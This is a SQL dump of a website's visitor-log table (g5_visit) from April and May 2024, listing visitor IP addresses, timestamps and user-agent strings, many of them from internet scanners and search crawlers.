INSERT INTO `g5_visit` VALUES ('1564', '172.105.128.12', '2024-04-16', '08:42:16', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1565', '216.219.94.195', '2024-04-16', '09:00:05', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1566', '198.235.24.22', '2024-04-16', '10:21:06', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1567', '69.164.217.245', '2024-04-16', '10:35:12', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1568', '45.79.172.21', '2024-04-16', '10:48:41', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1569', '45.79.181.251', '2024-04-16', '11:08:39', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1570', '194.120.230.94', '2024-04-16', '11:15:28', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1571', '205.210.31.174', '2024-04-16', '11:31:44', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1572', '65.49.20.69', '2024-04-16', '12:22:39', '', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1573', '162.216.150.221', '2024-04-16', '13:11:50', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1574', '170.64.232.108', '2024-04-16', '14:45:46', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1575', '198.235.24.37', '2024-04-16', '15:01:01', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1576', '164.52.0.94', '2024-04-16', '15:15:11', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1577', '205.210.31.9', '2024-04-16', '15:37:47', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1578', '117.253.249.243', '2024-04-16', '16:05:05', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1579', '85.203.47.15', '2024-04-16', '17:16:11', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.3', '', '', '');
INSERT INTO `g5_visit` VALUES ('1580', '104.199.31.214', '2024-04-16', '17:26:24', '', 'python-requests/2.31.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1581', '192.241.226.19', '2024-04-16', '18:26:20', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1582', '172.104.11.51', '2024-04-16', '22:12:46', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1583', '161.35.20.208', '2024-04-16', '22:17:31', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1584', '180.149.125.165', '2024-04-16', '23:58:08', '', 'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1585', '45.79.181.223', '2024-04-17', '00:05:13', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1586', '43.163.219.230', '2024-04-17', '00:20:32', '', 'curl/7.64.1', '', '', '');
INSERT INTO `g5_visit` VALUES ('1587', '123.160.221.130', '2024-04-17', '00:20:47', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1588', '123.160.221.132', '2024-04-17', '00:20:48', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1589', '185.180.143.12', '2024-04-17', '01:06:21', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1590', '172.105.128.13', '2024-04-17', '01:31:48', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1591', '45.79.181.251', '2024-04-17', '01:32:33', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1592', '146.19.24.28', '2024-04-17', '01:43:58', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1593', '178.34.119.16', '2024-04-17', '02:10:19', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1594', '192.155.90.118', '2024-04-17', '02:32:38', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1595', '35.203.210.110', '2024-04-17', '02:36:15', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1596', '185.224.128.43', '2024-04-17', '02:36:24', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1597', '45.79.168.172', '2024-04-17', '02:44:27', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1598', '172.104.11.4', '2024-04-17', '02:47:03', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1599', '192.155.88.231', '2024-04-17', '02:47:09', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1600', '45.79.181.179', '2024-04-17', '02:48:11', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1601', '66.175.213.4', '2024-04-17', '02:50:38', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1602', '45.79.172.21', '2024-04-17', '03:00:50', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1603', '192.155.90.220', '2024-04-17', '03:09:33', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1604', '46.174.191.28', '2024-04-17', '03:10:48', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko', '', '', '');
INSERT INTO `g5_visit` VALUES ('1605', '185.242.226.10', '2024-04-17', '03:30:57', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1606', '138.68.67.6', '2024-04-17', '04:53:51', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1607', '172.105.128.12', '2024-04-17', '05:39:19', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1608', '172.104.11.51', '2024-04-17', '06:01:15', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1609', '69.164.217.74', '2024-04-17', '06:32:05', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1610', '45.79.163.53', '2024-04-17', '06:55:29', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1611', '185.191.126.213', '2024-04-17', '07:05:00', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1612', '172.104.11.34', '2024-04-17', '07:51:01', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1613', '172.104.11.46', '2024-04-17', '07:56:22', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1614', '69.166.230.246', '2024-04-17', '08:21:41', '', 'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30', '', '', '');
INSERT INTO `g5_visit` VALUES ('1615', '45.79.181.94', '2024-04-17', '08:53:25', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1616', '87.236.176.101', '2024-04-17', '08:53:35', '', 'Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)', '', '', '');
INSERT INTO `g5_visit` VALUES ('1617', '205.210.31.133', '2024-04-17', '08:58:07', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1618', '198.235.24.237', '2024-04-17', '09:04:01', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1619', '45.79.128.205', '2024-04-17', '09:07:46', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1620', '35.203.211.24', '2024-04-17', '10:42:46', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1621', '172.105.128.11', '2024-04-17', '11:11:50', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1622', '165.154.206.35', '2024-04-17', '11:42:15', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1623', '45.79.181.104', '2024-04-17', '11:54:57', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1624', '159.65.252.125', '2024-04-17', '12:28:15', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1625', '64.62.197.187', '2024-04-17', '12:32:19', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0.0 (Edition Yx 05)', '', '', '');
INSERT INTO `g5_visit` VALUES ('1626', '198.235.24.154', '2024-04-17', '13:02:02', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1627', '130.211.54.158', '2024-04-17', '14:43:16', '', 'python-requests/2.31.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1628', '174.138.84.9', '2024-04-17', '14:45:30', '', 'Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1629', '193.106.29.125', '2024-04-17', '15:38:49', '', 'Mozilla/5.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1630', '172.104.210.105', '2024-04-17', '18:06:08', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1631', '198.74.56.46', '2024-04-17', '20:04:26', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1632', '212.70.149.134', '2024-04-17', '20:30:27', '', 'masscan/1.0 (https://github.com/robertdavidgraham/masscan)', '', '', '');
INSERT INTO `g5_visit` VALUES ('1633', '168.76.20.229', '2024-04-17', '22:16:03', '', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.2623.112 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1634', '146.19.24.28', '2024-04-18', '00:05:54', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1635', '185.191.126.213', '2024-04-18', '00:17:54', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1636', '45.79.181.94', '2024-04-18', '00:20:11', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1637', '107.170.236.5', '2024-04-18', '00:50:10', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1638', '45.79.181.179', '2024-04-18', '01:13:11', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1639', '45.79.168.172', '2024-04-18', '01:20:27', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1640', '172.105.128.13', '2024-04-18', '01:26:20', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1641', '138.199.36.208', '2024-04-18', '01:33:47', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.3', '', '', '');
INSERT INTO `g5_visit` VALUES ('1642', '69.164.217.74', '2024-04-18', '02:51:54', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1643', '66.175.213.4', '2024-04-18', '02:52:07', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1644', '185.224.128.43', '2024-04-18', '03:01:16', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1645', '167.172.183.173', '2024-04-18', '03:57:57', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1646', '184.105.247.254', '2024-04-18', '04:15:22', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1647', '185.180.143.79', '2024-04-18', '05:11:50', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1648', '205.210.31.254', '2024-04-18', '05:26:33', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1649', '185.180.143.71', '2024-04-18', '05:52:23', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1650', '85.140.11.209', '2024-04-18', '06:13:26', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1651', '162.250.120.117', '2024-04-18', '07:53:56', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1652', '45.79.181.223', '2024-04-18', '08:06:57', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1653', '192.155.88.231', '2024-04-18', '08:48:40', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1654', '45.33.80.243', '2024-04-18', '08:48:47', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1655', '167.94.146.58', '2024-04-18', '08:53:11', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1656', '64.62.156.14', '2024-04-18', '09:03:26', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1657', '61.32.31.241', '2024-04-18', '09:57:06', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Whale/3.25.232.19 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1658', '118.235.7.222', '2024-04-18', '10:00:55', '', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1659', '167.94.145.60', '2024-04-18', '10:07:11', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1660', '162.142.125.223', '2024-04-18', '10:22:49', '', 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)', '', '', '');
INSERT INTO `g5_visit` VALUES ('1661', '172.105.128.11', '2024-04-18', '10:26:22', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1662', '138.197.156.186', '2024-04-18', '10:28:53', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1663', '207.46.13.151', '2024-04-18', '13:28:15', '', 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1664', '207.46.13.6', '2024-04-18', '13:28:49', '', 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1665', '27.0.238.70', '2024-04-18', '13:43:22', '', 'facebookexternalhit/1.1; kakaotalk-scrap/1.0; +https://devtalk.kakao.com/t/scrap/33984', '', '', '');
INSERT INTO `g5_visit` VALUES ('1666', '211.231.103.94', '2024-04-18', '13:43:22', '', 'facebookexternalhit/1.1; kakaotalk-scrap/1.0; +https://devtalk.kakao.com/t/scrap/33984', '', '', '');
INSERT INTO `g5_visit` VALUES ('1667', '157.55.39.52', '2024-04-18', '13:53:18', '', 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1668', '46.101.115.195', '2024-04-18', '14:03:02', '', 'Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)', '', '', '');
INSERT INTO `g5_visit` VALUES ('1669', '118.235.7.50', '2024-04-18', '14:26:05', '', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1670', '45.142.182.118', '2024-04-18', '14:37:09', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1671', '46.174.191.28', '2024-04-18', '14:42:38', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko', '', '', '');
INSERT INTO `g5_visit` VALUES ('1672', '45.79.181.251', '2024-04-18', '15:01:17', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1673', '167.94.138.36', '2024-04-18', '15:15:41', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1674', '59.15.128.169', '2024-05-01', '15:41:03', 'http://34.64.36.149/install/install_db.php', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1675', '146.19.24.28', '2024-05-01', '17:03:40', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1676', '173.255.221.189', '2024-05-01', '17:04:10', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1677', '45.79.181.251', '2024-05-01', '17:04:19', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1678', '205.210.31.50', '2024-05-01', '18:47:02', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1679', '185.220.205.131', '2024-05-01', '18:57:32', '', 'Linux Gnu (cow)', '', '', '');
INSERT INTO `g5_visit` VALUES ('1680', '185.224.128.43', '2024-05-01', '19:12:41', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1681', '62.176.113.135', '2024-05-01', '20:12:53', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7', '', '', '');
INSERT INTO `g5_visit` VALUES ('1682', '64.62.197.240', '2024-05-01', '20:29:47', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1683', '101.36.114.209', '2024-05-01', '20:33:38', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1684', '185.180.140.5', '2024-05-01', '22:00:07', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1685', '162.216.150.179', '2024-05-01', '22:10:16', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1686', '118.235.6.198', '2024-05-01', '22:14:45', '', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1687', '185.16.38.111', '2024-05-01', '22:25:36', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1688', '46.174.191.30', '2024-05-01', '22:54:24', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko', '', '', '');
INSERT INTO `g5_visit` VALUES ('1689', '45.156.129.46', '2024-05-01', '22:56:13', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1690', '185.16.38.111', '2024-05-02', '00:37:50', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1691', '185.224.128.43', '2024-05-02', '00:39:54', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1692', '34.78.228.189', '2024-05-02', '01:58:55', '', 'python-requests/2.31.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1693', '46.174.191.28', '2024-05-02', '03:23:01', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko', '', '', '');
